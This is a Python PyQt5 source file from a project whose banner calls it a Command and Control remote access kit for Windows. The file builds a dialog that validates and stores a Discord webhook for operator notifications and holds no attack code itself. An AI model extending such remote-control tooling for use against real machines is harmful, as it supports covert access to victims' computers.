#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.21
# -------------------------------------------------------------
from PyQt5 import QtCore, QtWidgets
from core.Qt5.icons import IconObj
from core.logging.logging import DiscordCFG,ConsoleWindow
from core.utils.utils import Notifications,Validation,ErrorHandling

class Ui_webhook_dialog(object):

    #Function will update the webhook. takes dialog as param to close window if update is successful
    def update_webhook(self,webhook_dialog):
        webhook = self.webhook_input.text()                         #Get webhook text at click time
        try:                                                        #Try block to catch error for post request
            if Validation().validate_discord_webhook(webhook) == True:  #If the validation function returns true
                DiscordCFG().record_webhook(webhook)                    #Record the valid webhook
                Notifications().raise_notification(f'Updated webhook to:\n{webhook}','Success') #Notify the user that the webhook is valid
                webhook_dialog.close()                                                          #Close the webhook gui
                ConsoleWindow().log_to_console('Webhook is valid. Discord notifications are now available') #Log success to console
            else:                                               #Else, the validation function will return false
                ErrorHandling().raise_error('Invalid Webhook',                      #So we raise error
                                        'Webhook did not pass validation test.',
                                        'Webhook Error',)
                ConsoleWindow().log_to_console('Webhhook failed validation test')   #Log event to console
                self.webhook_input.clear()
        except Exception:                                                           #Exception block means there is a URL error
            ErrorHandling().raise_error('Invalid URL',                              #Raise URL error
                                        'Error during post request',
                                        'Network Error',)
            ConsoleWindow().log_to_console('Invalid webhook URL. Error during post reqest') #Log error to console
            self.webhook_input.clear()                                              #Clear the input box

    def setupUi(self, webhook_dialog):
        """
        Initialize UI parameter
        """
        webhook_dialog.setObjectName("webhook_dialog")
        webhook_dialog.resize(400, 80)
        webhook_dialog.setWindowIcon(IconObj().discord_icon)
        """
        Create gui objects
        """
        self.update_webhook_button = QtWidgets.QPushButton(webhook_dialog,clicked=lambda: self.update_webhook(webhook_dialog))
        self.webhook_input = QtWidgets.QLineEdit(webhook_dialog)
        """
        Set object sizes
        """
        self.webhook_input.setGeometry(QtCore.QRect(10, 10, 381, 31))
        self.update_webhook_button.setGeometry(QtCore.QRect(300, 50, 87, 27))
        """
        Set object names
        """
        self.update_webhook_button.setObjectName("update_webhook_button")
        self.webhook_input.setObjectName("webhook_input")
        """
        Finish setting up the UI
        """
        self.retranslateUi(webhook_dialog)
        QtCore.QMetaObject.connectSlotsByName(webhook_dialog)

    def retranslateUi(self, webhook_dialog):
        _translate = QtCore.QCoreApplication.translate
        webhook_dialog.setWindowTitle(_translate("webhook_dialog", "Discord Webhook"))
        self.webhook_input.setText(_translate("webhook_dialog",DiscordCFG().retrieve_webhook()))
        self.update_webhook_button.setText(_translate("webhook_dialog", "Update"))